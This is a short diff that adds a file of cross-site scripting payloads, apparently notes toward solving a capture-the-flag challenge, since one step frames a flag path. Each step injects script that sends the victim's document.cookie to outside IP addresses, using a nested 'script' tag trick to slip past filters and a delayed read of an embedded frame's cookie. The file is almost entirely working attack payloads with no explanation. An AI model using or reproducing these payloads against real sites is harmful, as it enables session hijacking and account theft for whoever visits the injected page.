@@ -1,0 +1,19 @@
+step 1: 
+<scriscriptpt>location.href='http://121.42.175.111:1234/'+document.cookie;</scriscriptpt>
+
+step2:
+//gg<link rel="prefetch" href="http://121.42.175.111:2333/">
+location.href='http://121.42.175.111:8080/xss/xss_new.php?cookie=' + escape(document.cookie);
+
+gg<SCRIPT src="http://123.207.24.193:8099/xss2/admin233333333_message.php?r=27912817acad7c627719e9df19968abf"></SCRIPT>
+
+step3:
+//<link rel="prefetch" href="http://121.42.175.111:2333/">
+setTimeout(function () {
+	location.href='http://121.42.175.111:8080/xss/xss_new.php?cookie=' + this.window.frames[0].document.cookie;
+}, 3000);
+
+
+<iframe src="/xss2/f1ag_1s_h3r3_2333"></iframe>  
+<SCRIPT src="http://123.207.24.193:8099/xss2/admin233333333_message.php?r=16151aae188a4bba6cb8fa2402d14dfe"></SCRIPT>
+
